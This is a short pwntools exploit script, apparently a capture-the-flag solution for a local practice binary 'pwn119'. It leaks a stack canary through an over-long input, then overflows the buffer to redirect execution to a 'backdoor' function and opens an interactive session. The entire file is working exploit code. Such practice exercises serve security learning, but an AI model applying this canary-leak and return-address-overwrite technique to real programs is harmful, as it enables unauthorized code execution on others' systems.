from pwn import *
from pathlib import Path
context.arch = "i386"
context.log_level = "info"
BACKDOOR = 0x08048636
pwn = Path(__file__).resolve().with_name("pwn119")
pwn_root = Path(__file__).resolve().parents[3]
loader = pwn_root / "libc/2.23/i386/ld-linux.so.2"
libdir = pwn_root / "libc/2.23/i386/lib"
p = process([str(loader), "--library-path", str(libdir), str(pwn)])
# consume banner
p.recv(timeout=3)
# stage 1: leak canary
p.send(b"A" * 101)
data = p.recv(300, timeout=3)
idx = data.find(b"A" * 101)
canary = b"\x00" + data[idx + 101: idx + 104]
log.success(f"canary: {canary.hex()}")
# wait for next fork iteration
p.recv(timeout=2)
# stage 2: overflow → backdoor
p.send(b"A" * 100 + canary + p32(0x42424242) + p32(0x43434343) + p32(0x44444444) + p32(BACKDOOR))
p.interactive()
